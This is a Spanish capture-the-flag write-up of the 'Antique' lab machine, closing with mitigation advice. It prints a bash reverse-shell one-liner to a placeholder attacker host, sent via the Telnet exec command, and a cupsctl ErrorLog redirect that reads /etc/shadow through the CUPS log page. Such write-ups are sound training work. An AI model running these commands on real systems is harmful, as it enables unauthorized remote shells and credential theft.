# Antique — Writeup

**Resumen rápido**  
Máquina objetivo con servicio Telnet expuesto (impresora HP JetDirect) y SNMP accesible que filtra credenciales. Exploté SNMP para recuperar la contraseña del servicio Telnet, obtuve una reverse shell como usuario local, y luego escalé a `root` aprovechando una vulnerabilidad en CUPS (lectura de ficheros mediante ErrorLog). Resultado: `user.txt` y `root.txt` obtenidos.

---

## Tabla de contenidos
- [Resumen](#resumen)
- [Reconocimiento](#reconocimiento)
- [Enumeración](#enumeración)
- [Explotación inicial — Telnet via SNMP](#explotación-inicial---telnet-via-snmp)
- [Reverse shell y obtención de `user.txt`](#reverse-shell-y-obtención-de-usertxt)
- [Escalada de privilegios — CUPS (ErrorLog) exploit](#escalada-de-privilegios---cups-errorlog-exploit)
- [Cadena de explotación (resumen)](#cadena-de-explotación-resumen)
- [Mitigaciones recomendadas](#mitigaciones-recomendadas)
- [Appendix — comandos y scripts usados (sin cambios)](#appendix--comandos-y-scripts-usados-sin-cambios)

---

## Resumen
En esta máquina identifiqué un servicio Telnet en el puerto 23 que parecía pertenecer a una impresora HP JetDirect. Tras fallar con intentos de contraseña trivial, enumeré la red y encontré SNMP (UDP 161) expuesto. Con `snmpwalk` extraje una cadena hexadecimal que, al decodificarla, resultó ser la contraseña de la impresora. Me conecté por Telnet, ejecuté un comando `exec` para lanzar una reverse shell y obtuve `user.txt`. Para la escalada, descubrí un servicio web CUPS en el puerto 631; usando la opción `cupsctl` cambié el `ErrorLog` a un fichero sensible (`/etc/shadow` y posteriormente la `root.txt`) y lo visualicé vía la interfaz de logs de CUPS para obtener `root.txt`.

---

## Reconocimiento

- Realicé un escaneo TCP/UDP para descubrir servicios.
- Detecté **puerto 23 (Telnet)** abierto; el banner/behavior sugería una impresora HP JetDirect.
- Tras conectar por Telnet, el login no se consiguió con contraseñas triviales, por lo que procedí a una enumeración más exhaustiva, incluyendo UDP.

---

## Enumeración

- Busqué puertos UDP y encontré **161/udp (SNMP)** abierto.
- Enumeré SNMP con `snmpwalk` para intentar extraer información sensible.

Comando usado para SNMP enumeration (tal cual):
```bash
snmpwalk -c COMUNITY_STRING -v 2c IP_VICTIMA 1
````

* La salida contenía una **cadena en hexadecimal**. Al decodificarla resultó ser la contraseña de Telnet de la impresora.

**Nota:** SNMP mal configurado (p. ej. community string por defecto o información excesiva disponible) puede revelar secretos críticos. Aquí se aprovechó para recuperar credenciales locales de un servicio.

---

## Explotación inicial — Telnet via SNMP

* Con la contraseña extraída por SNMP me conecté vía Telnet a la impresora/servicio en el puerto 23.
* En la sesión de Telnet el comando `?` mostró que la impresora permitía ejecutar comandos (capacidad de ejecución remota).
* Aprovechando esto se ejecutó un `exec` para lanzar una reverse shell hacia mi máquina atacante.

Comando usado en Telnet (tal cual):

```
exec bash -c "bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1"
```

---

## Reverse shell y obtención de `user.txt`

* Tras ejecutar el `exec` desde Telnet, recibí una reverse shell en mi listener y pude explorar el sistema con los privilegios del proceso que ejecuta la impresora (usuario local).
* Localicé `user.txt` en el directorio home de la víctima y lo recuperé.

**Ruta de `user.txt`:**

> `user.txt` ubicado en el directorio home del usuario en la máquina objetivo (según tus notas).

---

## Escalada de privilegios — CUPS (ErrorLog) exploit

* Buscando escalada revisé puertos y procesos locales para encontrar servicios accesibles internamente:

  * Ejecuté `netstat -ano` y observé que había algo escuchando en **puerto 631**.
  * Intenté conectar con `netcat` sin éxito directo, pero un `curl` a ese puerto confirmó que era una interfaz web (CUPS).

* Para ver la web usé SSH/`chisel` para hacer port forwarding y acceder desde mi máquina, confirmando la versión del servicio: **CUPS 1.6.1**.

* Aproveché una vulnerabilidad en CUPS relacionada con los logs de error: CUPS permite cambiar la ubicación del error log con `cupsctl`. Al redefinir `ErrorLog` a un fichero del sistema (por ejemplo `/etc/shadow`), se puede acceder al archivo a través de la interfaz de logs de CUPS:

Comando usado (tal cual):

```
cupsctl ErrorLog="/etc/shadow"
```

* Después apunté al endpoint de logs de CUPS, por ejemplo:

```
http://localhost:631/admin/log/error_log
```

y pude visualizar `/etc/shadow`.

* Repetí el proceso apuntando el `ErrorLog` a la ruta que contiene `root.txt` (suponiendo `/root/root.txt`) y así obtuve la `root.txt`.

**Importante:** esta técnica explota capacidades administrativas de CUPS para redirigir el archivo de log a archivos arbitrarios y luego exponerlos vía la interfaz de administración. En entornos mal configurados donde la interfaz es accesible sin restricciones, permite lectura de ficheros arbitrarios como `root`.

---

## Cadena de explotación (resumen)

1. Escaneo inicial → puerto **23 (Telnet)** abierto (impresora HP JetDirect).
2. Enumeración UDP → **161/udp (SNMP)** encontrado.
3. `snmpwalk` → extracción de cadena hex → decodificada = contraseña Telnet.
4. Conexión Telnet → uso de `exec` para lanzar reverse shell → obtención de `user.txt`.
5. Búsqueda de servicios locales → **631 (CUPS)** detectado.
6. Uso de `cupsctl` para fijar `ErrorLog` a `/etc/shadow` (y luego a `root.txt`) y lectura vía `http://localhost:631/admin/log/error_log`.
7. Lectura de `root.txt` → `root` comprometido.

---

## Mitigaciones recomendadas

* **SNMP:** no exponer SNMP en interfaces no confiables; usar SNMPv3 con autenticación y cifrado; cambiar community strings por defecto y limitar acceso por ACL/IP.
* **Telnet:** evitar Telnet en favor de SSH; si un dispositivo necesita acceso remoto, usar túneles seguros y credenciales fuertes.
* **Control de ejecución en dispositivos:** limitar comandos ejecutables desde interfaces de gestión (Telnet/HTTP) y aplicar autenticación fuerte y control de acceso.
* **CUPS:** restringir acceso a la interfaz de administración de CUPS (bind a localhost, firewall, autenticación), parchear a versiones sin la vulnerabilidad; evitar permitir `cupsctl` sin restricciones o desde contextos no seguros.
* **Hardening general:** revisar permisos de servicios y ficheros, minimizar superficie expuesta y aplicar autenticación/registro/monitorización para detectar exfiltración y cambios en la configuración.

---

## Appendix — comandos y scripts usados (sin cambios)

### SNMP enumeration

```bash
snmpwalk -c COMUNITY_STRING -v 2c IP_VICTIMA 1
```

### Telnet — exec reverse shell (comando usado dentro de Telnet)

```
exec bash -c "bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1"
```

### Netstat

```bash
netstat -ano
```

### cupsctl para redirigir ErrorLog (leer /etc/shadow vía CUPS)

```
cupsctl ErrorLog="/etc/shadow"
```

### Endpoint de logs de CUPS (ejemplo)

Acceder en el navegador o con curl:

```
http://localhost:631/admin/log/error_log
```

---

## Notas finales

* Esta máquina ilustra una cadena clásica donde servicios de gestión expuestos (SNMP, Telnet, paneles administrativos) y malas prácticas en la configuración (CUPS accesible sin restricciones) se combinan para una escalada completa.
* En entornos reales, la exposición de SNMP y Telnet, junto con interfaces administrativas sin autenticación/seguridad, representa riesgos críticos.

